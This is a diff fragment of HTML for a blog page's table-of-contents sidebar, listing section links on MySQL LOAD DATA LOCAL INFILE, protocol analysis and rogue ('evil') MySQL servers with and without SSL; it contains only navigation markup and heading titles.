+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#LOAD-DATE-LOCAL-INFILE"><span class="nav-number">1.</span> <span class="nav-text">LOAD DATE LOCAL INFILE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#协议分析"><span class="nav-number">2.</span> <span class="nav-text">协议分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-evil-server"><span class="nav-number">3.</span> <span class="nav-text">mysql evil server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-evil-ssl-server"><span class="nav-number">4.</span> <span class="nav-text">mysql evil ssl server</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
